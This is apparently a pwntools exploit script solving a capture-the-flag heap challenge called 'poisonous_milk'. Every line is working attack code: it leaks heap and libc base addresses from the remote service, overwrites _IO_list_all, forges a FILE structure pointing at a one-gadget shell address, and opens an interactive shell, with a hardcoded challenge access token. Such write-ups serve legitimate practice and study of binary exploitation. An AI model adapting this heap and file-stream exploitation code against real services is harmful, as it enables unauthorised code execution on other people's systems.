#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('poisonous_milk'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def put(flags, color):
    r.sendlineafter('> ', 'p')
    r.sendlineafter(': ', flags)
    r.sendlineafter(': ', color)

def view():
    r.sendlineafter('> ', 'v')

def remove(idx):
    r.sendlineafter('> ', 'r')
    r.sendlineafter(': ', str(idx))

def drink():
    r.sendlineafter('> ', 'd')

def leak(idx=0):
    r.recvuntil('[{}] ['.format(idx))
    return u64(r.recvuntil(']', drop=True).ljust(8, '\x00'))


r = remote(HOST, PORT)
if len(sys.argv) > 2: r.sendlineafter('Token:', 'izLYkkq655yLanSM3nFDaeb6EzmWXvL5')

# leak base
put('a'*0x10, '')
p = log.progress('prepare leaking ...')
for i in range(0x12): put('', '')
view()
for i in range(0x11):
    p.status(str(i) + ' chunks')
    leak(i)
p.success('done')
heap_base = leak(17) - 0x12290
log.info('heap_base: {}'.format(hex(heap_base)))
libc_base = leak(18) - 0x3c3b88
log.info('libc_base: {}'.format(hex(libc_base)))

# use vector to overwrite _IO_list_all
_IO_list_all = libc_base + 0x3c4518
buf_addr = _IO_list_all
drink()
fake_milks = p64(buf_addr) + p64(buf_addr + 0x8) + p64(buf_addr + 0x18)
put(fake_milks[:-2], '')

# use two chunks to forge FILE structure
first = flat(0, 1).ljust(0x50)
last = flat('a'*0x20, 0, libc_base + 0xf0567, 0, heap_base + 0x11cf0).ljust(0x50)
put(first, '')
put(last, '')

r.interactive()
